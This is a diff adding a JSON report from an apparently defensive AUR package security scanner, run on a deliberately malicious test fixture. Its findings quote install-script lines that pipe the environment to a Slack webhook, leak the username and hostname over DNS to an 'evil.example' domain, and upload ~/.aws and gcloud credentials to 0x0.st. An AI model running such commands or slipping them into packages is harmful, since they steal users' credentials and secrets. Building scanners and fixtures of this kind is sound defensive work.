@@ -1,0 +1,202 @@
+{
+  "package_name": "stats-collector",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "INSTALL-003",
+      "severity": "critical",
+      "category": "network_security",
+      "title": "Network access in install script (install script)",
+      "description": "Install scripts should not make network connections",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install",
+        "line": 2,
+        "column": 9,
+        "snippet": "  env | curl --data-binary @- https://hooks.slack.com/services/T0/B0/xxxx"
+      },
+      "recommendation": "Install scripts should never download additional content",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "curl"
+      }
+    },
+    {
+      "id": "INSTALL-003",
+      "severity": "critical",
+      "category": "network_security",
+      "title": "Network access in install script (install script)",
+      "description": "Install scripts should not make network connections",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install",
+        "line": 4,
+        "column": 39,
+        "snippet": "  tar czf - ~/.aws ~/.config/gcloud | curl --upload-file - https://0x0.st"
+      },
+      "recommendation": "Install scripts should never download additional content",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "curl"
+      }
+    },
+    {
+      "id": "EXFIL-001",
+      "severity": "critical",
+      "category": "data_exfiltration",
+      "title": "Curl POST data exfiltration (install script)",
+      "description": "Sending data to external servers via curl POST",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install",
+        "line": 2,
+        "column": 9,
+        "snippet": "  env | curl --data-binary @- https://hooks.slack.com/services/T0/B0/xxxx"
+      },
+      "recommendation": "Build/install should not send data externally",
+      "cwe_id": "CWE-200",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "curl --data-binary "
+      }
+    },
+    {
+      "id": "EXFIL-004",
+      "severity": "critical",
+      "category": "data_exfiltration",
+      "title": "DNS exfiltration (install script)",
+      "description": "Data smuggled out via DNS lookups (dig/nslookup/host of a command-substituted subdomain, or a TXT query to an attacker domain).",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install",
+        "line": 3,
+        "column": 3,
+        "snippet": "  dig +short \"$(whoami).$(hostname).exfil.evil.example\""
+      },
+      "recommendation": "Review the destination domain; this pattern smuggles data over DNS.",
+      "cwe_id": "CWE-200",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "dig +short \"$(whoami).$("
+      }
+    },
+    {
+      "id": "EXFIL-008",
+      "severity": "critical",
+      "category": "data_exfiltration",
+      "title": "Slack/Teams webhook exfiltration (install script)",
+      "description": "Posting to a Slack or Microsoft Teams incoming webhook — a common low-friction exfil/C2 channel.",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install",
+        "line": 2,
+        "column": 39,
+        "snippet": "  env | curl --data-binary @- https://hooks.slack.com/services/T0/B0/xxxx"
+      },
+      "recommendation": "Remove. Packages do not post to chat webhooks during build/install.",
+      "cwe_id": "CWE-200",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "hooks.slack.com/services/"
+      }
+    },
+    {
+      "id": "HIDDEN-001",
+      "severity": "high",
+      "category": "malicious_code",
+      "title": "Hidden file creation in home (install script)",
+      "description": "Creating hidden files in user home directory",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install",
+        "line": 4,
+        "column": 13,
+        "snippet": "  tar czf - ~/.aws ~/.config/gcloud | curl --upload-file - https://0x0.st"
+      },
+      "recommendation": "Packages should not create hidden files in user home",
+      "cwe_id": null,
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "~/.aws ~"
+      }
+    },
+    {
+      "id": "EXFIL-006",
+      "severity": "high",
+      "category": "data_exfiltration",
+      "title": "HTTP upload exfiltration (install script)",
+      "description": "curl uploading a local file (-T/--upload-file/-F/--data-urlencode) — used to send harvested data to an attacker endpoint.",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install",
+        "line": 4,
+        "column": 39,
+        "snippet": "  tar czf - ~/.aws ~/.config/gcloud | curl --upload-file - https://0x0.st"
+      },
+      "recommendation": "Verify what is being uploaded and to where.",
+      "cwe_id": "CWE-200",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "curl --upload-file"
+      }
+    },
+    {
+      "id": "EXFIL-009",
+      "severity": "high",
+      "category": "data_exfiltration",
+      "title": "Anonymous file-drop / tunnel host (install script)",
+      "description": "Uploads to a throwaway file-drop or tunnels through ngrok/webhook.site/requestbin/IPFS — exfil and ad-hoc C2 endpoints.",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install",
+        "line": 4,
+        "column": 68,
+        "snippet": "  tar czf - ~/.aws ~/.config/gcloud | curl --upload-file - https://0x0.st"
+      },
+      "recommendation": "Review the destination; these are common exfil/C2 hosts.",
+      "cwe_id": "CWE-200",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "0x0.st"
+      }
+    },
+    {
+      "id": "CRED-008",
+      "severity": "high",
+      "category": "credential_theft",
+      "title": "Environment/secret dump (install script)",
+      "description": "Dumping the environment (env/printenv) to a file or pipe to curl/nc/base64 — harvests tokens and secrets exposed as env vars.",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install",
+        "line": 2,
+        "column": 3,
+        "snippet": "  env | curl --data-binary @- https://hooks.slack.com/services/T0/B0/xxxx"
+      },
+      "recommendation": "Remove. Packages have no reason to dump the environment.",
+      "cwe_id": "CWE-522",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "env | curl"
+      }
+    },
+    {
+      "id": "CRED-004",
+      "severity": "high",
+      "category": "credential_theft",
+      "title": "Cloud / CI credential file access (install script)",
+      "description": "Reads cloud or CI credential files (gcloud, docker config, npmrc, pypirc, cargo/terraform credentials, git-credentials).",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install",
+        "line": 4,
+        "column": 22,
+        "snippet": "  tar czf - ~/.aws ~/.config/gcloud | curl --upload-file - https://0x0.st"
+      },
+      "recommendation": "Verify why a build/install touches credential files.",
+      "cwe_id": "CWE-522",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": ".config/gcloud"
+      }
+    }
+  ],
+  "scanned_files": [
+    "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/PKGBUILD",
+    "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/exfil-channels/stats-collector.install"
+  ],
+  "timestamp": "2026-06-15T01:57:16.818366384Z",
+  "scan_duration_ms": 3
+}
